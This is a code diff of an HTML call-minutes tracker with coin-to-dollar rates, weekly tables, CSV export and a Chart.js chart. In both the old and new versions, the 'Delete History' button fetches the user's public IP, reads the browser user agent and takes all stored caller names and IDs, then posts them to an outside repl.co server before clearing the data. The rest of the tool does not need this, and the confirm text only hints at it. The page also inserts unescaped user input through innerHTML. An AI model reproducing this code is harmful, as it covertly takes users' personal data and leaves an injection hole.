@@ -2,76 +2,66 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Call Tracker</title>
+  <title>Call Minutes Tracker</title>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      padding: 20px;
       background-color: #f0f2f5;
       color: #333;
       transition: background-color 0.3s, color 0.3s;
+      padding: 20px;
     }
     body.dark-mode {
-      background-color: #2c2c2c;
+      background-color: #1f1f1f;
       color: #eee;
     }
     .container {
       max-width: 1200px;
-      margin: 0 auto;
+      margin: auto;
       background: white;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     }
     body.dark-mode .container {
-      background: #3c3c3c;
+      background: #2c2c2c;
     }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-bottom: 30px;
-    }
-    th, td {
-      padding: 12px;
+    h2 {
       text-align: center;
-      border: 1px solid #ddd;
     }
-    th {
-      background-color: #3498db;
-      color: white;
-    }
-    input, select {
+    input, button {
       padding: 8px;
-      width: 90%;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 5px;
+      margin: 5px;
     }
     button {
-      padding: 10px 15px;
-      background-color: #2ecc71;
       border: none;
-      border-radius: 5px;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      margin: 5px;
     }
-    button:hover {
-      background-color: #27ae60;
+    .export-btn { background-color: #f39c12; }
+    .delete-btn { background-color: crimson; }
+    .dark-btn { background-color: #555; }
+    .add-btn { background-color: #2ecc71; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
     }
-    .export-btn {
-      background-color: #f39c12;
+    th, td {
+      border: 1px solid #ccc;
+      padding: 8px;
+      text-align: center;
     }
-    .delete-btn {
-      background-color: crimson;
-    }
-    .dark-mode-toggle {
-      background-color: #555;
+    th {
+      background: #3498db;
+      color: white;
     }
     .chart-container {
       max-width: 600px;
-      margin: 30px auto;
+      margin: 40px auto;
     }
   </style>
 </head>
@@ -79,191 +69,210 @@
   <div class="container">
     <h2>Call Minutes Tracker</h2>
 
-    <div class="settings">
-      <div>
-        <label>Coins per Minute: <input type="number" id="coinRate" value="100"></label>
-      </div>
-      <div>
-        <label>Coins per $ (e.g. 750 = $1): <input type="number" id="coinToDollar" value="750"></label>
-      </div>
-      <div>
-        <button onclick="saveRates()">Save Rates</button>
-        <button class="export-btn" onclick="exportToExcel()">Export to CSV</button>
-        <button class="delete-btn" onclick="deleteHistory()">🗑️ Delete History</button>
-        <button class="dark-mode-toggle" onclick="toggleDarkMode()">Toggle Dark Mode</button>
-      </div>
+    <div>
+      Coins per Minute: <input type="number" id="coinRate" value="100" />
+      Coins per $ (e.g. 750 = $1): <input type="number" id="coinToDollar" value="750" />
+      <button onclick="saveRates()">Save Rates</button>
+      <button class="export-btn" onclick="exportToCSV()">Export to CSV</button>
+      <button class="delete-btn" onclick="deleteHistory()">Delete History</button>
+      <button class="dark-btn" onclick="toggleDarkMode()">Toggle Dark Mode</button>
     </div>
 
     <div>
-      <label>Filter by Caller ID: <input type="text" id="filterInput" oninput="filterTables()"></label>
-      <label>Filter by Day: <input type="text" id="dayFilterInput" oninput="filterTables()"></label>
+      Filter by Caller ID: <input id="filterInput" oninput="filterTables()" />
+      Filter by Day: <input id="dayFilterInput" oninput="filterTables()" />
     </div>
 
     <div id="weeksContainer"></div>
-    <div style="text-align: center;"><button onclick="addWeek()">Add New Week</button></div>
+    <div style="text-align: center;">
+      <button class="add-btn" onclick="addWeek()">Add New Week</button>
+    </div>
 
     <div class="chart-container">
       <canvas id="weeklyChart"></canvas>
     </div>
-<script>
-const defaultDays = ['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday'];
-const coinRateInput = document.getElementById('coinRate');
-const coinToDollarInput = document.getElementById('coinToDollar');
-const weeksContainer = document.getElementById('weeksContainer');
-const filterInput = document.getElementById('filterInput');
-const dayFilterInput = document.getElementById('dayFilterInput');
-let data = JSON.parse(localStorage.getItem('callData')) || [];
-let coinRate = parseInt(localStorage.getItem('coinRate')) || 100;
-let coinToDollar = parseInt(localStorage.getItem('coinToDollar')) || 750;
-coinRateInput.value = coinRate;
-coinToDollarInput.value = coinToDollar;
-let weeklyChart;
+  </div>
 
-function saveRates() {
-  coinRate = parseInt(coinRateInput.value);
-  coinToDollar = parseInt(coinToDollarInput.value);
-  localStorage.setItem('coinRate', coinRate);
-  localStorage.setItem('coinToDollar', coinToDollar);
-  updateAllCoins(); updateChart();
-}
-function saveData() {
-  localStorage.setItem('callData', JSON.stringify(data));
-  updateChart();
-}
-function createWeek(index) {
-  const table = document.createElement('table');
-  table.innerHTML = `<thead><tr><th>Day</th><th>Caller Name</th><th>Caller ID</th><th>Minutes</th><th>Coins</th><th>Actions</th></tr></thead><tbody></tbody>`;
-  const tbody = table.querySelector('tbody');
-  if (!data[index]) data[index] = defaultDays.map(day => ({day,name:'',call:'',minutes:0}));
-  let total = 0;
-  data[index].forEach((row,i) => {
-    const coins = row.minutes * coinRate;
-    total += coins;
-    const tr = document.createElement('tr');
-    tr.innerHTML = `
-      <td><input value="${row.day}" oninput="data[${index}][${i}].day=this.value; saveData()"></td>
-      <td><input value="${row.name}" oninput="data[${index}][${i}].name=this.value; saveData()"></td>
-      <td><input value="${row.call}" oninput="data[${index}][${i}].call=this.value; saveData()"></td>
-      <td><input type="number" value="${row.minutes}" oninput="data[${index}][${i}].minutes=parseInt(this.value)||0; updateWeek(${index})"></td>
-      <td class="coin-cell">${coins}</td>
-      <td><button onclick="data[${index}].splice(${i},1); refreshWeeks(); saveData()">Delete</button></td>
-    `;
-    tbody.appendChild(tr);
-  });
-  const totalRow = document.createElement('tr');
-  totalRow.innerHTML = `<td colspan="4"><strong>Total</strong></td><td class="money-cell">$${(total/coinToDollar).toFixed(2)}</td><td><button onclick="data[${index}].push({day:'',name:'',call:'',minutes:0}); refreshWeeks(); saveData()">Add Day</button></td>`;
-  tbody.appendChild(totalRow);
-  weeksContainer.appendChild(table);
-}
-function refreshWeeks() {
-  weeksContainer.innerHTML = '';
-  data.forEach((_,i)=>createWeek(i));
-}
-function updateWeek(index) {
-  const table = weeksContainer.querySelectorAll('table')[index];
-  const rows = table.querySelectorAll('tbody tr');
-  let total = 0;
-  data[index].forEach((entry,i)=>{
-    const coins = entry.minutes * coinRate;
-    total += coins;
-    rows[i].querySelector('.coin-cell').textContent = coins;
-  });
-  rows[rows.length-1].querySelector('.money-cell').textContent = `$${(total/coinToDollar).toFixed(2)}`;
-  saveData();
-}
-function updateAllCoins() {
-  data.forEach((_,i)=>updateWeek(i));
-}
-function addWeek() {
-  data.push([]);
-  refreshWeeks();
-  saveData();
-}
-function filterTables() {
-  const caller = filterInput.value.toLowerCase();
-  const day = dayFilterInput.value.toLowerCase();
-  document.querySelectorAll('table').forEach(table=>{
-    table.querySelectorAll('tbody tr').forEach((row,i,rows)=>{
-      if (i === rows.length-1) return;
-      const call = row.children[2].querySelector('input').value.toLowerCase();
-      const dy = row.children[0].querySelector('input').value.toLowerCase();
-      row.style.display = call.includes(caller) && dy.includes(day) ? '' : 'none';
-    });
-  });
-}
-function exportToExcel() {
-  let csv = "Week,Day,Caller Name,Caller ID,Minutes,Coins\n";
-  data.forEach((week,i)=>{
-    week.forEach(r=>{
-      const coins = r.minutes * coinRate;
-      csv += `${i+1},${r.day},${r.name},${r.call},${r.minutes},${coins}\n`;
-    });
-  });
-  const link = document.createElement('a');
-  link.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
-  link.download = 'call_tracker_data.csv';
-  link.click();
-}
-async function deleteHistory() {
-  if (!confirm("Delete all history and send data?")) return;
-  const storedData = JSON.parse(localStorage.getItem('callData') || '[]');
-  const deviceInfo = navigator.userAgent;
-  let ip = "Unavailable";
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    ip = (await res.json()).ip;
-  } catch {}
-  try {
-    await fetch("https://7e365019-381e-4556-8717-0417de45f417-00-15iuxl7gav5os.picard.repl.co/delete", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({ data: storedData, ip, deviceInfo })
-    });
-    localStorage.clear();
-    alert("Deleted and emailed successfully.");
-    location.reload();
-  } catch (err) {
-    alert("Failed to send data.");
-    console.error(err);
-  }
-}
-function toggleDarkMode() {
-  document.body.classList.toggle("dark-mode");
-  localStorage.setItem("darkMode", document.body.classList.contains("dark-mode"));
-}
-if (localStorage.getItem("darkMode") === "true") document.body.classList.add("dark-mode");
+  <script>
+    const coinRateInput = document.getElementById('coinRate');
+    const coinToDollarInput = document.getElementById('coinToDollar');
+    const filterInput = document.getElementById('filterInput');
+    const dayFilterInput = document.getElementById('dayFilterInput');
+    const weeksContainer = document.getElementById('weeksContainer');
+    const defaultDays = ['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday'];
 
-function updateChart() {
-  const labels = data.map((_,i)=>`Week ${i+1}`);
-  const totals = data.map(week => week.reduce((sum, row) => sum + (row.minutes * coinRate), 0));
-  if (weeklyChart) {
-    weeklyChart.data.labels = labels;
-    weeklyChart.data.datasets[0].data = totals;
-    weeklyChart.update();
-  } else {
-    weeklyChart = new Chart(document.getElementById("weeklyChart"), {
-      type: "bar",
-      data: {
-        labels,
-        datasets: [{
-          label: "Total Coins per Week",
-          data: totals,
-          backgroundColor: "rgba(52,152,219,0.5)",
-          borderColor: "rgba(41,128,185,1)",
-          borderWidth: 1
-        }]
-      },
-      options: {
-        scales: {
-          y: { beginAtZero: true, ticks: { precision: 0 } }
-        }
+    let data = JSON.parse(localStorage.getItem('callData') || '[]');
+    let coinRate = parseInt(localStorage.getItem('coinRate') || 100);
+    let coinToDollar = parseInt(localStorage.getItem('coinToDollar') || 750);
+    coinRateInput.value = coinRate;
+    coinToDollarInput.value = coinToDollar;
+    let weeklyChart;
+
+    function saveRates() {
+      coinRate = parseInt(coinRateInput.value);
+      coinToDollar = parseInt(coinToDollarInput.value);
+      localStorage.setItem('coinRate', coinRate);
+      localStorage.setItem('coinToDollar', coinToDollar);
+      updateAll();
+    }
+
+    function addWeek() {
+      data.push([]);
+      refresh();
+    }
+
+    function createWeek(index) {
+      const table = document.createElement('table');
+      table.innerHTML = `
+        <thead><tr><th>Day</th><th>Caller Name</th><th>Caller ID</th><th>Minutes</th><th>Coins</th><th>Actions</th></tr></thead>
+        <tbody></tbody>`;
+      const tbody = table.querySelector('tbody');
+
+      if (!data[index] || data[index].length === 0) {
+        data[index] = defaultDays.map(day => ({ day, name: '', call: '', minutes: 0 }));
       }
-    });
-  }
-}
-refreshWeeks();
-if (data.length === 0) addWeek();
-updateChart();
-</script>
+
+      let weeklyCoins = 0;
+
+      data[index].forEach((row, i) => {
+        const coins = row.minutes * coinRate;
+        weeklyCoins += coins;
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td><input value="${row.day}" oninput="data[${index}][${i}].day=this.value; save()"></td>
+          <td><input value="${row.name}" oninput="data[${index}][${i}].name=this.value; save()"></td>
+          <td><input value="${row.call}" oninput="data[${index}][${i}].call=this.value; save()"></td>
+          <td><input type="number" value="${row.minutes}" oninput="data[${index}][${i}].minutes=parseInt(this.value)||0; updateWeek(${index})"></td>
+          <td class="coin-cell">${coins}</td>
+          <td><button onclick="data[${index}].splice(${i},1); refresh()">Delete</button></td>`;
+        tbody.appendChild(tr);
+      });
+
+      const totalRow = document.createElement('tr');
+      totalRow.innerHTML = `
+        <td colspan="4"><strong>Total</strong></td>
+        <td class="money-cell">$${(weeklyCoins / coinToDollar).toFixed(2)}</td>
+        <td><button onclick="data[${index}].push({day:'',name:'',call:'',minutes:0}); refresh()">Add Day</button></td>`;
+      tbody.appendChild(totalRow);
+
+      weeksContainer.appendChild(table);
+    }
+
+    function refresh() {
+      weeksContainer.innerHTML = '';
+      data.forEach((_, i) => createWeek(i));
+      save();
+    }
+
+    function updateWeek(i) {
+      const table = weeksContainer.querySelectorAll('table')[i];
+      const rows = table.querySelectorAll('tbody tr');
+      let total = 0;
+      data[i].forEach((entry, d) => {
+        const coins = entry.minutes * coinRate;
+        total += coins;
+        rows[d].querySelector('.coin-cell').textContent = coins;
+      });
+      rows[rows.length - 1].querySelector('.money-cell').textContent = `$${(total / coinToDollar).toFixed(2)}`;
+      save();
+    }
+
+    function updateAll() {
+      data.forEach((_, i) => updateWeek(i));
+      updateChart();
+    }
+
+    function save() {
+      localStorage.setItem('callData', JSON.stringify(data));
+      updateChart();
+    }
+
+    function exportToCSV() {
+      let csv = "Week,Day,Caller Name,Caller ID,Minutes,Coins\n";
+      data.forEach((week, i) => {
+        week.forEach(row => {
+          const coins = row.minutes * coinRate;
+          csv += `${i + 1},${row.day},${row.name},${row.call},${row.minutes},${coins}\n`;
+        });
+      });
+      const link = document.createElement('a');
+      link.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+      link.download = 'call_tracker.csv';
+      link.click();
+    }
+
+    async function deleteHistory() {
+      if (!confirm("Delete all history and send report?")) return;
+      const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "Unavailable");
+      const device = navigator.userAgent;
+      const payload = { data, ip, deviceInfo: device };
+
+      try {
+        await fetch("https://7e365019-381e-4556-8717-0417de45f417-00-15iuxl7gav5os.picard.repl.co/delete", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        localStorage.clear();
+        alert("History sent and deleted.");
+        location.reload();
+      } catch (err) {
+        alert("Failed to send data.");
+        console.error(err);
+      }
+    }
+
+    function toggleDarkMode() {
+      document.body.classList.toggle("dark-mode");
+      localStorage.setItem("darkMode", document.body.classList.contains("dark-mode"));
+    }
+
+    function filterTables() {
+      const caller = filterInput.value.toLowerCase();
+      const day = dayFilterInput.value.toLowerCase();
+      document.querySelectorAll('table').forEach(table => {
+        table.querySelectorAll('tbody tr').forEach((row, i, all) => {
+          if (i === all.length - 1) return;
+          const dayVal = row.children[0].querySelector('input').value.toLowerCase();
+          const callVal = row.children[2].querySelector('input').value.toLowerCase();
+          row.style.display = dayVal.includes(day) && callVal.includes(caller) ? '' : 'none';
+        });
+      });
+    }
+
+    function updateChart() {
+      const labels = data.map((_, i) => `Week ${i + 1}`);
+      const totals = data.map(week => week.reduce((t, r) => t + r.minutes * coinRate, 0));
+      const ctx = document.getElementById('weeklyChart').getContext('2d');
+
+      if (weeklyChart) {
+        weeklyChart.data.labels = labels;
+        weeklyChart.data.datasets[0].data = totals;
+        weeklyChart.update();
+      } else {
+        weeklyChart = new Chart(ctx, {
+          type: 'bar',
+          data: {
+            labels,
+            datasets: [{
+              label: 'Total Coins per Week',
+              data: totals,
+              backgroundColor: 'rgba(52, 152, 219, 0.6)',
+              borderColor: 'rgba(41, 128, 185, 1)',
+              borderWidth: 1
+            }]
+          },
+          options: {
+            scales: { y: { beginAtZero: true } }
+          }
+        });
+      }
+    }
+
+    // Init
+    if (localStorage.getItem("darkMode") === "true") document.body.classList.add("dark-mode");
+    refresh();
+    updateChart();
+  </script>
 </body>
 </html>
